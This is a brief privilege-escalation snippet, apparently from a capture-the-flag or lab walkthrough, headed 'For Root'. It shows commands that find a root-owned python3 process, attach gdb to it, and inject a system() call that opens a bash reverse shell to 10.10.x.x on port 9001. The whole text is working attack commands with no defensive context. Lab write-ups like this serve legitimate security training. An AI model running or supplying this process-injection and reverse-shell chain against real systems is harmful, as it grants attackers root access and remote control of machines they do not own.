For Root:  
  

`export PID=$(ps aux | grep "^root.*python3" | awk '{print $2}')`

`gdb -p $PID`

`call (void)system("bash -c 'bash -i >& /dev/tcp/10.10.x.x/9001 0>&1'")`